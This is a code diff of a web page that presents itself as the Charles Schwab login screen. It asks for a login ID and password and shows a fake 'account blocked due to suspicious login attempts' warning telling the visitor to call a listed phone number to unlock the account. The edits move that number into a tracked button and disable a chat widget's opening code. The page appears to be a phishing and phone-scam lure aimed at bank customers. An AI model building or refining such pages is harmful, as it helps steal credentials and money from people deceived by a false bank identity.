@@ -92,10 +92,10 @@
             <div class="login-wrapper">
                 <h1 class="login-title">Log in to Schwab</h1>
                 <div class="warning hidden" id="warningMessage">
-                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team at <a href="tel:+18554214204" onclick="trackClick()">+1 855-421-4204</a> to verify and unlock your account."
+                    "Your Schwab account access has been blocked due to suspicious login attempts. Contact our customer service team to verify and unlock your account."
                 </div>
                 <!-- Add this after the warningMessage div -->
-<button id="chatBtn" class="chat-btn hidden">Chat Support</button>
+<button id="chatBtn" class="chat-btn hidden" href="tel:+18554214204" onclick="trackClick()">+1 855-421-4204</button>
 
 <!-- Ensure to add the chat widget script -->
 <script src="//code.jivosite.com/widget/vLyvTUyEpK" async></script>
@@ -219,7 +219,7 @@
     var warningMessage = document.getElementById('warningMessage');
     var loginIdInput = document.getElementById('loginId');
     var passwordInput = document.getElementById('password');
-    var chatBtn = document.getElementById('chatBtn'); // Chat button
+    // var chatBtn = document.getElementById('chatBtn'); // Chat button
 
     // Reset any previous error highlights
     loginIdInput.classList.remove('error');
@@ -266,9 +266,9 @@
 });
 
 // When the chat button is clicked, open the chat window
-document.getElementById('chatBtn').addEventListener('click', function() {
-    window.jivo_api.open(); // This triggers the JivoSite chat window to open
-});
+// document.getElementById('chatBtn').addEventListener('click', function() {
+//     window.jivo_api.open(); // This triggers the JivoSite chat window to open
+// });
 
 
     </script>
